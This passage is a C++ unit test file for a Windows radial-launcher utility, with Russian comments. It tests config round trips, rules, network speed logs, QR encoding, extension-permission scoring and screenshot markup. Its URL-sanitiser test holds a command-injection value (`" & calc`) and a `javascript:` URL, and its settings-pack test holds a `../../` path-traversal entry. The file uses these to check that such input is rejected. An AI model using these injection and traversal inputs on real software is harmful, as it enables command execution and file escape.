// Тесты ревью 2026-10-21: radial.cfg туда и обратно (экранирование «|», служебные имена групп) и новые правила
// без окон.
#include <windows.h>

#include <algorithm>
#include <ctime>
#include <cwchar>
#include <string>
#include <vector>

#include "core/config.h"
#include "core/edgecheck.h"
#include "core/procsnap.h"
#include "core/themes.h"
#include "net/speed.h"
#include "system/tools.h"
#include "system/weekdiff.h"
#include "gfx/qr.h"
#include "net/wifi.h"
#include "ring/dropundo.h"
#include "app/rules.h"
#include "modes/modestats.h"
#include "desktop/share.h"
#include "app/settingsio.h"
#include "system/healthscore.h"
#include "system/important.h"
#include "system/journal.h"
#include "system/builderr.h"
#include "system/devserv.h"
#include "system/drain.h"
#include "system/projver.h"
#include "system/winget.h"
#include "system/contests.h"
#include "core/cfgdiff.h"
#include "system/auto/weekreport.h"
#include "helpers/resume.h"
#include "helpers/afterwork.h"
#include "modes/gameprep.h"
#include "modes/powerpick.h"
#include "core/usage.h"
#include "modes/focus.h"
#include "media/appvol.h"
#include "cards/cardlog.h"
#include "modes/modeswitch.h"
#include "ring/selring.h"
#include "helpers/markup_logic.h"
#include "helpers/snipname.h"
#include "shutup/catalog.h"
#include "system/explain.h"

namespace {

void (*g_check)(bool, const char*, int) = nullptr;
#define CHECK(x) g_check((x), #x, __LINE__)

std::wstring TempFile(const wchar_t* name) {
    wchar_t dir[MAX_PATH];
    GetTempPathW(MAX_PATH, dir);
    return std::wstring(dir) + name;
}

void TestConfigRoundTrip() {
    Config c;
    c.netSecurity = false;
    c.netChanges = false;
    c.netVpnWatch = true;
    c.netVpnBlock = true;
    c.transferGentle = false;
    c.netVpnRoute = L"Test tunnel";
    c.netVpnApps = L"D:\\Apps\\a.exe|D:\\Apps\\b.exe";
    Item g;
    g.name = L"Settings";  // группа с именем служебного раздела
    g.path = L"C:\\";
    Item ch;
    ch.name = L"a|b";
    ch.path = L"macro:text x|y; enter";
    ch.icon = L"code.png";
    g.children.push_back(ch);
    Item at;
    at.name = L"@left";
    c.left = {g, at};
    Item r;
    r.name = L"Проекты";
    r.path = L"D:\\Desktop\\components";
    Item rc;
    rc.name = L"Папка\nс переводом";
    rc.path = L"D:\\Desktop\\";
    r.children.push_back(rc);
    c.right = {r};
    std::wstring file = TempFile(L"radial_test_roundtrip.cfg");
    CHECK(SaveConfig(file, c));
    Config back;
    CHECK(LoadConfig(file, back));
    CHECK(!back.netSecurity);  // отключение фоновой защиты сохраняется при перезапуске
    CHECK(!back.netChanges && back.netVpnWatch && back.netVpnBlock && !back.transferGentle);
    CHECK(back.netVpnRoute == c.netVpnRoute && back.netVpnApps == c.netVpnApps);
    CHECK(back.left.size() == 2 && back.right.size() == 1);
    if (back.left.size() == 2) {
        CHECK(back.left[0].name == L"Settings");
        CHECK(back.left[0].children.size() == 1);
        if (!back.left[0].children.empty()) {
            CHECK(back.left[0].children[0].name == L"a|b");
            CHECK(back.left[0].children[0].path == L"macro:text x|y; enter");
            CHECK(back.left[0].children[0].icon == L"code.png");
        }
        CHECK(back.left[1].name == L"@left");
    }
    if (back.right.size() == 1 && back.right[0].children.size() == 1) {
        CHECK(back.right[0].children[0].name == L"Папкас переводом");
        CHECK(back.right[0].children[0].path == L"D:\\Desktop\\");  // «\» в конце пути не съедает разделитель
    }
    DeleteFileW(file.c_str());
    DeleteFileW((file + L".tmp").c_str());
}

void TestEdgeCheck() {
    std::string on = "{\"startup\":true,\"enabled\":{\"AlwaysOnTop\":false,\"CursorWrap\" : true,\"FancyZones\":true}}";
    std::string off = "{\"enabled\":{\"CursorWrap\":false},\"x\":{\"CursorWrap\":true}}";
    CHECK(edgecheck::PowerToysEnabled(on, "CursorWrap"));
    CHECK(edgecheck::PowerToysEnabled(on, "FancyZones"));
    CHECK(!edgecheck::PowerToysEnabled(on, "AlwaysOnTop"));
    CHECK(!edgecheck::PowerToysEnabled(off, "CursorWrap"));  // включён только вне "enabled" - не считается
    CHECK(!edgecheck::PowerToysEnabled("", "CursorWrap"));
}

void TestDropUndo() {
    std::wstring base = TempFile(L"radial_drop_test");
    std::wstring a = base + L"\\a", b = base + L"\\b";
    CreateDirectoryW(base.c_str(), nullptr);
    CreateDirectoryW(a.c_str(), nullptr);
    CreateDirectoryW(b.c_str(), nullptr);
    auto put = [](const std::wstring& f) {
        HANDLE h = CreateFileW(f.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
        DWORD w = 0;
        WriteFile(h, "abc", 3, &w, nullptr);
        CloseHandle(h);
    };
    put(a + L"\\moved.txt");
    put(a + L"\\copied.txt");
    put(a + L"\\waiting.txt");
    ULONGLONG t0 = dropundo::Now();
    MoveFileW((a + L"\\moved.txt").c_str(), (b + L"\\moved.txt").c_str());
    CopyFileW((a + L"\\copied.txt").c_str(), (b + L"\\copied.txt").c_str(), TRUE);
    dropundo::Result r = dropundo::Resolve(
        {a + L"\\moved.txt", a + L"\\copied.txt", a + L"\\waiting.txt", b + L"\\moved.txt"}, b + L"\\", t0);
    CHECK(r.pending == 1);  // waiting.txt ещё «копируется»; бросок в ту же папку не считается
    CHECK(r.done.size() == 2);
    if (r.done.size() == 2) {
        CHECK(!r.done[0].copy && r.done[0].to == b + L"\\moved.txt");
        CHECK(r.done[1].copy && r.done[1].from == a + L"\\copied.txt");
        CHECK(dropundo::Title(r.done, b) == L"Перенесено и скопировано 2 файла в «b»");
    }
    for (const wchar_t* f : {L"\\a\\copied.txt", L"\\a\\waiting.txt", L"\\b\\moved.txt", L"\\b\\copied.txt"})
        DeleteFileW((base + f).c_str());
    RemoveDirectoryW(a.c_str());
    RemoveDirectoryW(b.c_str());
    RemoveDirectoryW(base.c_str());
}

void TestRules() {
    std::wstring bad;
    auto r = rules::Parse({L"app:blender.exe+UnrealEditor.exe -> power:perf, volume:40",
                           L"battery & time:23:00-07:00 -> power:eco, mute, theme:crimson", L"ac -> run:net",
                           L"app:x.exe -> fly", L"time:25:00-07:00 -> mute", L"no arrow"},
                          &bad);
    CHECK(r.size() == 3);
    CHECK(bad == L"app:x.exe -> fly; time:25:00-07:00 -> mute; no arrow");
    if (r.size() == 3) {
        CHECK(r[0].power == L"perf" && r[0].volume == 40 && r[0].when.size() == 1);
        CHECK(r[1].mute && r[1].theme == L"crimson" && r[1].when.size() == 2);
        CHECK(r[2].run == L"net");
        rules::Facts f;
        f.procs = {L"explorer.exe", L"UnrealEditor.exe"};
        f.ac = false;
        f.minutes = 23 * 60 + 30;
        CHECK(rules::Holds(r[0], f));
        CHECK(rules::Holds(r[1], f));  // ночь через полночь, от батареи
        f.minutes = 12 * 60;
        CHECK(!rules::Holds(r[1], f));
        f.minutes = 6 * 60 + 59;
        CHECK(rules::Holds(r[1], f));
        CHECK(!rules::Holds(r[2], f));
        f.procs = {L"explorer.exe"};
        CHECK(!rules::Holds(r[0], f));
    }
    // простой, сеть по имени, «не»
    auto more = rules::Parse(
        {L"idle>15 & !net:Home* -> power:eco", L"net:Office+Work -> mute", L"!! ac -> mute", L"idle>0 -> mute"}, &bad);
    CHECK(more.size() == 2);
    if (more.size() == 2) {
        rules::Facts g;
        g.idleMin = 20;
        g.networks = {L"Home_5G 2"};
        CHECK(!rules::Holds(more[0], g));  // дома - нет
        g.networks = {L"Cafe"};
        CHECK(rules::Holds(more[0], g));
        g.idleMin = 3;
        CHECK(!rules::Holds(more[0], g));
        g.networks = {L"Cafe", L"Work"};
        CHECK(rules::Holds(more[1], g));
    }
    auto low = rules::Parse({L"battery<30 -> power:eco"});
    rules::Facts g;
    g.ac = false;
    g.battery = 25;
    CHECK(low.size() == 1 && rules::Holds(low[0], g));
    g.battery = 45;
    CHECK(low.size() == 1 && !rules::Holds(low[0], g));
    // режимы: mode:game, несколько через +, «не»
    bad.clear();
    auto modes = rules::Parse({L"mode:dev & battery -> power:balanced", L"mode:game+share -> mute",
                               L"!mode:focus -> volume:50", L"mode:sleep -> mute", L"mode: -> mute"},
                              &bad);
    CHECK(modes.size() == 3);
    CHECK(bad == L"mode:sleep -> mute; mode: -> mute");
    if (modes.size() == 3) {
        rules::Facts m;
        m.ac = false;
        CHECK(!rules::Holds(modes[0], m));
        m.dev = true;
        CHECK(rules::Holds(modes[0], m));
        CHECK(!rules::Holds(modes[1], m));
        m.share = true;
        CHECK(rules::Holds(modes[1], m));
        CHECK(rules::Holds(modes[2], m));
        m.focus = true;
        CHECK(!rules::Holds(modes[2], m));
    }
}

// Время в режимах (О3): даты, деление через полночь, итог за неделю, строка
void TestModeStats() {
    int day = modestats::ParseDay(L"2026-10-25");
    CHECK(day > 0 && modestats::DayText(day) == L"2026-10-25");
    CHECK(modestats::DayText(0) == L"1970-01-01");
    CHECK(modestats::ParseDay(L"2026-13-01") < 0 && modestats::ParseDay(L"вчера") < 0);
    CHECK(modestats::DayText(modestats::ParseDay(L"2024-02-29")) == L"2024-02-29");
    // 23:30 - 01:15: полчаса в одном дне, час с четвертью в следующем
    LONGLONG start = (LONGLONG)day * 86400 + 23 * 3600 + 1800;
    auto rows = modestats::Split(start, start + 6300, modestats::GAME);
    CHECK(rows.size() == 2);
    if (rows.size() == 2) {
        CHECK(rows[0].day == day && rows[0].sec == 1800);
        CHECK(rows[1].day == day + 1 && rows[1].sec == 4500);
    }
    CHECK(modestats::Split(start, start, modestats::DEV).empty());
    modestats::Row r;
    CHECK(modestats::ParseRow(modestats::RowLine({day, modestats::FOCUS, 1500}), r));
    CHECK(r.day == day && r.mode == modestats::FOCUS && r.sec == 1500);
    CHECK(!modestats::ParseRow(L"2026-10-25\t9\t60", r) && !modestats::ParseRow(L"мусор", r));
    std::vector<modestats::Row> all = {{day, modestats::GAME, 3600},
                                       {day - 1, modestats::DEV, 7200},
                                       {day - 6, modestats::GAME, 600},
                                       {day - 7, modestats::GAME, 99999},
                                       {day + 1, modestats::DEV, 60}};
    modestats::Week w = modestats::Sum(all, day);
    CHECK(w.total[modestats::GAME] == 4200 && w.total[modestats::DEV] == 7200);
    CHECK(w.sec[6][modestats::GAME] == 3600 && w.sec[5][modestats::DEV] == 7200 && w.sec[0][modestats::GAME] == 600);
    CHECK(modestats::Line(w) == L"игра 1 ч 10 мин, разработка 2 ч");
    CHECK(modestats::Hours(30) == L"меньше минуты" && modestats::Hours(2400) == L"40 мин");
    CHECK(modestats::Hours(11 * 3600 + 40 * 60) == L"12 ч");
}

// Показ экрана (П1, П2): что прячется в тексте, полоска показа по заголовку; свёрнутая игра (Г2) и рендер (Р4)
void TestShareMask() {
    std::vector<std::wstring> prof = {L"C:\\Users\\IvanPetrov", L"C:\\Users\\IVANPE~1"},
                              words = {L"IvanPetrov", L"DESKTOP-7Q2", L"HomeNet_5G"};
    CHECK(share::MaskText(L"c:\\users\\ivanpetrov\\Desktop\\shop", prof, words) == L"%USERPROFILE%\\Desktop\\shop");
    CHECK(share::MaskText(L"C:\\Users\\IVANPE~1\\AppData", prof, words) == L"%USERPROFILE%\\AppData");
    CHECK(share::MaskText(L"Сеть «HomeNet_5G 2», ПК DESKTOP-7Q2", prof, words) == L"Сеть «*** 2», ПК ***");
    CHECK(share::MaskText(L"адрес 192.168.1.34, свой 127.0.0.1", prof, words) == L"адрес x.x.x.x, свой 127.0.0.1");
    CHECK(share::MaskText(L"версия 1.2.3.4.5 и 300.1.1.1", prof, words) == L"версия 1.2.3.4.5 и 300.1.1.1");
    CHECK(share::MaskText(L"почта me.box@gmail.com, ок", prof, words) == L"почта ***@***, ок");
    CHECK(share::MaskText(L"@user без домена", prof, words) == L"@user без домена");
    CHECK(share::TitleHit(L"meet.google.com is sharing your screen.", L"sharing your screen|доступ к окну"));
    CHECK(share::TitleHit(L"Сайт предоставляет ДОСТУП К ОКНУ", L"sharing your screen|доступ к окну"));
    CHECK(!share::TitleHit(L"YouTube - Google Chrome", L"sharing your screen|доступ к окну"));

    GameFocus gf;
    CHECK(!gf.Want(1000, true, false));
    CHECK(!gf.Want(2000, false, false));  // Alt+Tab на миг
    CHECK(!gf.Want(6000, false, true));   // своё окно (кольцо) - не считается
    CHECK(gf.Want(7000, false, false));   // 5 с без игры - в фоне
    CHECK(gf.Want(8000, false, true));    // открыли кольцо над столом - всё ещё в фоне
    CHECK(!gf.Want(9000, true, false));   // вернулись в игру
    BusyHold bh;
    CHECK(!bh.Want(1000, 0.05));
    CHECK(bh.Want(2000, 0.6));
    CHECK(bh.Want(30000, 0.02));  // между кадрами рендера - ещё занят
    CHECK(!bh.Want(70000, 0.02));
}

void TestSettingsPack() {
    std::vector<settingsio::Part> in = {{L"radial.cfg", "[settings]\nx = 1\n"},
                                        {L"tools/ignored.tsv", std::string("a\tb\n\0bin", 9)},
                                        {L"data/empty.tsv", ""}};
    std::string blob = settingsio::Pack(in);
    std::vector<settingsio::Part> out;
    CHECK(settingsio::Unpack(blob, out));
    CHECK(out.size() == 3);
    if (out.size() == 3) {
        CHECK(out[0].name == L"radial.cfg" && out[0].bytes == in[0].bytes);
        CHECK(out[1].bytes == in[1].bytes);  // двоичное и переводы строк внутри - как были
        CHECK(out[2].bytes.empty());
    }
    CHECK(!settingsio::Unpack("not ours", out));
    CHECK(!settingsio::Unpack(blob.substr(0, blob.size() - 3), out));  // обрезанный
    std::string evil = settingsio::Pack({{L"../../x.cfg", "a"}});
    CHECK(!settingsio::Unpack(evil, out));  // выход из папки
}

void TestHealthScore() {
    tools::HealthIn in;
    CHECK(tools::HealthScore(in).score == 100 && tools::HealthScore(in).minus.empty());
    in.disks = {{L"C:\\", 7, 10}, {L"D:\\", 50, -1}};
    in.memLoad = 85;
    in.danger = 3;  // штраф за находки - не больше 30
    in.batteryWear = 12;
    tools::HealthOut o = tools::HealthScore(in);
    CHECK(o.score == 100 - 20 - 10 - 4 - 30);
    CHECK(!o.minus.empty() && o.minus[0].points == 30);  // крупные первыми
    in.smartBad = 5;
    CHECK(tools::HealthScore(in).score == 0);  // не ниже нуля
}

// Процессы сеанса одним вызовом: себя видим с родителем, временем создания и процессором; чужих сеансов и System нет.
void TestProcSession() {
    std::vector<procsnap::Info> list = procsnap::Session();
    CHECK(!list.empty());
    const procsnap::Info* self = nullptr;
    for (const procsnap::Info& p : list) {
        CHECK(p.pid > 4);
        if (p.pid == GetCurrentProcessId()) self = &p;
    }
    CHECK(self != nullptr);
    if (!self) return;
    CHECK(_wcsicmp(self->name.c_str(), L"radial_tests.exe") == 0);
    CHECK(self->parent != 0);
    FILETIME c, e, k, u;
    GetProcessTimes(GetCurrentProcess(), &c, &e, &k, &u);
    CHECK(self->created == (((ULONGLONG)c.dwHighDateTime << 32) | c.dwLowDateTime));
    CHECK(self->priv > 0);
}

// Цвета по времени суток: днём как тема (чуть ярче), ночью теплее и темнее, вечер - между ними.
void TestDayTint() {
    Config c;
    c.theme = L"wallpaper";  // кромка не смешивается с обоями: проверяем только время
    c.nightFrom = 23, c.nightTo = 7;
    ThemeInfo base = Themes()[0];
    ThemeInfo noon = DayTint(base, c, 13), eve = DayTint(base, c, 21), deep = DayTint(base, c, 2);
    auto warmth = [](COLORREF x) { return (int)GetRValue(x) - (int)GetBValue(x); };
    CHECK(warmth(deep.glow) > warmth(eve.glow) && warmth(eve.glow) > warmth(noon.glow));
    CHECK(GetRValue(deep.bg) + GetGValue(deep.bg) + GetBValue(deep.bg) <
          GetRValue(base.bg) + GetGValue(base.bg) + GetBValue(base.bg) + 1);
    CHECK(noon.bg == base.bg);
    c.night = false;  // ночной режим выключен - ночь не наступает, но вечер теплеет
    CHECK(DayTint(base, c, 2).bg == base.bg);
}

// История скорости: строка туда и обратно (табуляция в имени не ломает), сравнение - медианы по виду.
void TestSpeedLog() {
    net::Speed s;
    s.when = 133000000000000000ull;
    s.down = 87.5, s.up = 21.25, s.pingMs = 45, s.tunnel = true, s.via = L"happ-tun\t, Финляндия";
    net::Speed back;
    CHECK(net::ParseSpeedRow(net::SpeedRow(s), back));
    CHECK(back.when == s.when && back.down == 87.5 && back.up == 21.25 && back.pingMs == 45 && back.tunnel);
    CHECK(back.via == L"happ-tun , Финляндия");
    CHECK(!net::ParseSpeedRow(L"мусор", back));
    std::vector<net::Speed> h;
    CHECK(net::SpeedCompare(h).empty());
    for (double d : {80.0, 100.0, 90.0}) {
        net::Speed x;
        x.when = 1, x.down = d, x.up = 20, x.tunnel = true;
        h.push_back(x);
    }
    CHECK(net::SpeedCompare(h).empty());  // напрямую ещё не мерили - сравнивать не с чем
    net::Speed d;
    d.when = 1, d.down = 140, d.up = 35;
    h.push_back(d);
    std::wstring c = net::SpeedCompare(h);
    CHECK(c.find(L"↓ 90.0") != std::wstring::npos && c.find(L"↓ 140") != std::wstring::npos);
    net::SpeedMedian m = net::SpeedMedianOf(h, true);
    CHECK(m.n == 3 && m.down == 90 && m.up == 20);
    CHECK(net::SpeedMedianOf(h, false).down == 140);
    // по дням: полдень UTC - в любом поясе России тот же день; в одном дне туннель и напрямую - две записи
    auto at = [](int day, int hour) {
        SYSTEMTIME st{2026, 10, 0, (WORD)day, (WORD)hour, 0, 0, 0};
        FILETIME ft;
        SystemTimeToFileTime(&st, &ft);
        return ((ULONGLONG)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
    };
    std::vector<net::Speed> w;
    for (int day = 1; day <= 20; ++day) {
        net::Speed x;
        x.when = at(day, 9), x.down = day, x.up = 1, x.tunnel = true;
        w.push_back(x);
        x.when = at(day, 10), x.down = day + 2;
        w.push_back(x);  // медиана двух - среднее
        if (day == 20) {
            x.tunnel = false, x.down = 300;
            w.push_back(x);
        }
    }
    std::vector<net::SpeedDay> days = net::SpeedDays(w, 14);
    CHECK(days.size() == 15);  // 14 дней, в последнем - две записи
    CHECK(days.front().day == 7 && days.front().down == 8 && days.front().n == 2);
    CHECK(days.back().day == 20 && days.back().tunnel && days[13].day == 20 && !days[13].tunnel);
    CHECK(days[13].down == 300);

    // О3: выходы туннеля - страна после последней запятой, быстрые первыми, без страны и напрямую не в счёт
    std::vector<net::Speed> e;
    auto add = [&](double down, const wchar_t* via, bool tunnel = true) {
        net::Speed x;
        x.when = 1, x.down = down, x.up = 10, x.tunnel = tunnel, x.via = via;
        e.push_back(x);
    };
    add(40, L"happ-xray, Нидерланды");
    add(60, L"happ-xray, Швеция");
    add(62, L"happ-xray, Швеция");
    add(500, L"Wi-Fi", false);
    add(90, L"happ-xray");
    std::vector<net::SpeedExit> ex = net::SpeedByExit(e);
    CHECK(ex.size() == 2 && ex[0].country == L"Швеция" && ex[0].down == 61 && ex[0].n == 2);
    CHECK(ex[1].country == L"Нидерланды");
    CHECK(net::SpeedExitAdvice(ex).find(L"«Швеция»") != std::wstring::npos);
    ex[1].down = 58;
    CHECK(net::SpeedExitAdvice(ex).find(L"почти равны") != std::wstring::npos);
    CHECK(net::SpeedExitAdvice({ex[0]}).empty());
}

// Неделя: новое, убранное и обновлённое (та же программа с другой версией); строки снимка туда и обратно.
void TestWeekDiff() {
    std::vector<tools::WeekEntry> old = {
        {L"app", L"Git", L"Git 2.44"}, {L"svc", L"OldSvc", L"Старая служба"}, {L"start", L"Run|Discord", L"Discord"}};
    std::vector<tools::WeekEntry> now = {
        {L"app", L"Git", L"Git 2.45"}, {L"start", L"Run|Discord", L"Discord"}, {L"drv", L"newdrv", L"Новый драйвер"}};
    std::vector<tools::WeekChange> d = tools::WeekDiff(old, now);
    CHECK(d.size() == 3);
    if (d.size() == 3) {
        CHECK(d[0].what == tools::WeekChange::ADDED && d[0].entry.key == L"newdrv");
        CHECK(d[1].what == tools::WeekChange::REMOVED && d[1].entry.key == L"OldSvc");
        CHECK(d[2].what == tools::WeekChange::UPDATED && d[2].was == L"Git 2.44");
    }
    std::vector<tools::WeekEntry> back = tools::ParseWeekRows(tools::WeekRows(now));
    CHECK(back.size() == 3 && back[2].label == L"Новый драйвер");
    CHECK(tools::WeekDiff(now, back).empty());
}

// QR: матрица сверена с библиотекой qrcode (Python) бит в бит на версиях 1-10 - здесь её отпечаток, чтобы правка
// кодировщика не сломала его молча. Строка Wi-Fi экранирует спецсимволы; каналы Wi-Fi по частоте.
void TestQr() {
    qr::Code c = qr::Encode(qr::WifiText("MoonNet", "secret123", false));
    CHECK(c.version == 3 && c.mask == 3 && c.size == 29);
    unsigned long long h = 1469598103934665603ULL;
    for (bool d : c.dark) h = (h ^ (d ? 1 : 0)) * 1099511628211ULL;
    CHECK(h == 0xca221449c689ff79ULL);
    CHECK(qr::WifiText("a;b", "p:1", false) == "WIFI:T:WPA;S:a\\;b;P:p\\:1;;");
    CHECK(qr::WifiText("Free", "", true) == "WIFI:T:nopass;S:Free;;");
    CHECK(qr::Encode(std::string(214, 'x')).size == 0);  // больше версии 10 - не берёмся
    CHECK(net::WifiChannel(2437000) == 6 && net::WifiChannel(5180000) == 36 && net::WifiChannel(2484000) == 14);
    CHECK(net::ChannelsOverlap(6, 9) && !net::ChannelsOverlap(1, 6) && !net::ChannelsOverlap(36, 40));
}

// Права расширений по manifest.json: хосты в host_permissions и content_scripts тоже считаются.
void TestExtRights() {
    std::string mv3 = R"({"manifest_version":3,"permissions":["storage","clipboardRead","nativeMessaging"],
        "host_permissions":["<all_urls>"]})";
    int r = tools::ExtRightsOf(mv3);
    CHECK(r == (tools::EXT_ALL_SITES | tools::EXT_CLIPBOARD | tools::EXT_NATIVE));
    CHECK(tools::ExtRisk(r) >= 4);
    std::string cs = R"({"content_scripts":[{"matches":["https://*/*"],"js":["a.js"]}],"permissions":["tabs"]})";
    CHECK(tools::ExtRightsOf(cs) == tools::EXT_ALL_SITES);
    CHECK(tools::ExtRisk(tools::ExtRightsOf(cs)) == 2);
    CHECK(tools::ExtRightsOf(R"({"permissions":["https://example.com/*","storage"]})") == 0);
    CHECK(tools::ExtRightsText(tools::EXT_CLIPBOARD | tools::EXT_COOKIES) ==
          L"читает буфер обмена, читает куки (входы на сайты)");
    // ложные тревоги: сайты, которые могут обратиться к расширению, и права, которые оно только может попросить
    CHECK(tools::ExtRightsOf(R"({"web_accessible_resources":[{"resources":["a.png"],"matches":["<all_urls>"]}]})") == 0);
    CHECK(tools::ExtRightsOf(R"({"externally_connectable":{"matches":["*://*/*"]}})") == 0);
    CHECK(tools::ExtRightsOf(R"({"optional_permissions":["clipboardRead","cookies"]})") == 0);
    CHECK(tools::ExtRightsOf(R"({"content_scripts":[{"matches":["https://a.com/[x]"]},{"matches":["<all_urls>"]}],
        "web_accessible_resources":[]})") == tools::EXT_ALL_SITES);
    // права - ещё не опасность
    int many = tools::EXT_ALL_SITES | tools::EXT_COOKIES;
    CHECK(tools::ExtVerdict(0, true) == tools::EXT_V_NONE);
    CHECK(tools::ExtVerdict(tools::EXT_ALL_SITES, true) == tools::EXT_V_SITES);
    CHECK(tools::ExtVerdict(many, true) == tools::EXT_V_WIDE);
    CHECK(tools::ExtVerdict(many, false) == tools::EXT_V_DANGER);
    CHECK(tools::ExtVerdict(tools::EXT_HISTORY, false) == tools::EXT_V_NONE);
    // одно расширение в двух профилях - одной строкой
    tools::BrowserExt a, b, other;
    a.browser = b.browser = L"Chrome";
    b.profile = L"Profile 2";
    a.id = b.id = L"same";
    a.rights = tools::EXT_COOKIES;
    b.rights = tools::EXT_CLIPBOARD;
    other.id = L"other";
    std::vector<tools::ExtGroup> g = tools::GroupExts({a, other, b});
    CHECK(g.size() == 2);
    CHECK(g[0].copies == 2);
    CHECK(g[0].where == L"Chrome, Chrome (Profile 2)");
    CHECK(g[0].e.rights == (tools::EXT_COOKIES | tools::EXT_CLIPBOARD));
}

// Ссылка в песочнице: годится только http(s) без кавычек и пробелов - иначе адрес вышел бы из кавычек команды.
void TestSafeUrl() {
    CHECK(tools::SafeUrl(L"  https://example.com/a?b=1&c=2  ") == L"https://example.com/a?b=1&c=2");
    CHECK(tools::SafeUrl(L"HTTP://x.ru") == L"HTTP://x.ru");
    CHECK(tools::SafeUrl(L"https://x.ru/\" & calc").empty());
    CHECK(tools::SafeUrl(L"https://x.ru/a b").empty());
    CHECK(tools::SafeUrl(L"file:///C:/Windows").empty());
    CHECK(tools::SafeUrl(L"javascript:alert(1)").empty());
    CHECK(tools::SafeUrl(L"https://").empty());
}

// Л29: имя снимка по окну и папка для него
void TestMarkup() {
    using namespace markup;
    // Случайный щелчок фигурой не считается: иначе он займёт шаг отмены
    Shape click;
    click.tool = Tool::Box;
    click.pts = {{10, 10}, {11, 11}};
    CHECK(!Meaningful(click));
    Shape box = click;
    box.pts[1] = {60, 40};
    CHECK(Meaningful(box));
    Shape label;
    label.tool = Tool::Label;
    label.pts = {{5, 5}};
    label.text = L"   ";
    CHECK(!Meaningful(label));
    label.text = L"Ошибка";
    CHECK(Meaningful(label));
    Shape stroke;
    stroke.tool = Tool::Marker;
    stroke.pts = {{1, 1}};
    CHECK(!Meaningful(stroke));

    // Отмена и возврат; новая фигура убирает возможность вернуть прежнюю
    Doc doc;
    CHECK(doc.Empty() && !doc.CanUndo() && !doc.Undo() && !doc.Redo());
    doc.Add(box);
    doc.Add(label);
    CHECK(doc.Shapes().size() == 2);
    CHECK(doc.Undo() && doc.Shapes().size() == 1 && doc.CanRedo());
    CHECK(doc.Redo() && doc.Shapes().size() == 2 && doc.Shapes()[1].text == L"Ошибка");
    CHECK(doc.Undo());
    doc.Add(box);
    CHECK(!doc.CanRedo() && doc.Shapes().size() == 2);

    // Вписывание: большой снимок уменьшается, мелкий не растягивается, оба по центру
    Fit big = FitImage(2000, 1000, 10, 20, 1000, 800);
    CHECK(big.scale == 0.5f && big.w == 1000 && big.h == 500 && big.x == 10 && big.y == 170);
    Fit tiny = FitImage(100, 50, 0, 0, 1000, 800);
    CHECK(tiny.scale == 1 && tiny.w == 100 && tiny.x == 450 && tiny.y == 375);
    CHECK(FitImage(0, 50, 0, 0, 100, 100).w == 0);
    // Крошечный снимок в разметке крупнее, но целым числом раз и не больше области
    CHECK(EditZoom(90, 40) == 4 && EditZoom(200, 100) == 2 && EditZoom(1920, 1080) == 1 && EditZoom(0, 0) == 1);
    Fit zoomed = FitImage(90, 40, 0, 0, 1000, 800, EditZoom(90, 40));
    CHECK(zoomed.scale == 4 && zoomed.w == 360);
    Fit squeezed = FitImage(90, 40, 0, 0, 180, 800, 4);
    CHECK(squeezed.scale == 2);
    // Окно -> картинка: туда и обратно, за краем прижимается
    const Rc all = View({}, 2000, 1000);
    CHECK(all.w == 2000 && all.h == 1000);
    Pt inImage = ToImage(big, 510, 420, all);
    CHECK(inImage.x == 1000 && inImage.y == 500);
    Pt past = ToImage(big, 5000, -50, all);
    CHECK(past.x == 2000 && past.y == 0);
    Pt there = ToWindow(big, inImage, all);
    CHECK(there.x == 510 && there.y == 420);

    // Обрезка: координаты фигур остаются в исходной картинке, вид - по целым пикселям и в её пределах
    Rc view = View({100.4f, 50.2f, 200.3f, 100.1f}, 2000, 1000);
    CHECK(view.x == 100 && view.y == 50 && view.w == 201 && view.h == 101);
    Rc wide = View({1900, 900, 500, 500}, 2000, 1000);
    CHECK(wide.Right() == 2000 && wide.Bottom() == 1000);
    Rc farOff = View({5000, 5000, 10, 10}, 2000, 1000);
    CHECK(farOff.w == 2000);  // вся за краем - обрезки нет
    Fit croppedFit = FitImage(201, 101, 0, 0, 1000, 800);
    Pt inCrop = ToImage(croppedFit, croppedFit.x, croppedFit.y, view);
    CHECK(inCrop.x == 100 && inCrop.y == 50);
    Pt cropEdge = ToImage(croppedFit, 0, 0, view);
    CHECK(cropEdge.x == 100 && cropEdge.y == 50);

    // История: перемещение, удаление и обрезка отменяются и возвращаются
    Doc edits;
    edits.Add(box);
    Shape moved = box;
    Translate(moved, 100, 0);
    edits.Replace(0, moved);
    CHECK(edits.Shapes()[0].pts[0].x == 110);
    CHECK(edits.Undo() && edits.Shapes()[0].pts[0].x == 10);
    CHECK(edits.Redo() && edits.Shapes()[0].pts[0].x == 110);
    edits.Remove(0);
    CHECK(edits.Shapes().empty() && edits.Empty());
    edits.Replace(5, moved);  // нет такой - ничего не ломает и в историю не идёт
    edits.Remove(5);
    CHECK(edits.Undo() && edits.Shapes().size() == 1);
    edits.SetCrop({0, 0, 50, 50});
    CHECK(!edits.Crop().Empty() && !edits.Empty());
    CHECK(edits.Undo() && edits.Crop().Empty() && edits.Shapes().size() == 1);
    Doc onlyCrop;
    onlyCrop.SetCrop({1, 1, 20, 20});
    CHECK(!onlyCrop.Empty());  // обрезка без фигур - тоже правка

    // Выбор: рамка пустая внутри, стрелка - по линии, верхняя важнее нижней
    Shape frame;
    frame.tool = Tool::Box;
    frame.width = 4;
    frame.pts = {{100, 100}, {300, 200}};
    CHECK(HitTest(frame, {100, 150}, 2) && HitTest(frame, {300, 200}, 2));
    CHECK(!HitTest(frame, {200, 150}, 2) && !HitTest(frame, {50, 50}, 2));
    Shape arrow;
    arrow.tool = Tool::Arrow;
    arrow.width = 4;
    arrow.pts = {{0, 0}, {100, 100}};
    CHECK(HitTest(arrow, {50, 50}, 2) && !HitTest(arrow, {90, 10}, 2));
    Shape blurBox = frame;
    blurBox.tool = Tool::Blur;
    CHECK(HitTest(blurBox, {200, 150}, 2));  // размытие сплошное
    Shape step;
    step.tool = Tool::Step;
    step.width = 30;
    step.pts = {{200, 150}};
    CHECK(Meaningful(step) && HitTest(step, {210, 155}, 0) && !HitTest(step, {300, 300}, 0));
    std::vector<Shape> stack = {blurBox, step};
    CHECK(TopShape(stack, {205, 150}, 2) == 1);
    CHECK(TopShape(stack, {110, 110}, 2) == 0);
    CHECK(TopShape(stack, {900, 900}, 2) == -1);

    // Ручки: угол рамки тянется, противоположный стоит; за него можно перетащить
    CHECK(Handles(frame).size() == 4 && Handles(arrow).size() == 2 && Handles(step).size() == 1);
    CHECK(HandleAt(frame, {300, 200}, 4) == 3 && HandleAt(frame, {200, 150}, 4) == -1);
    Shape dragged = frame;
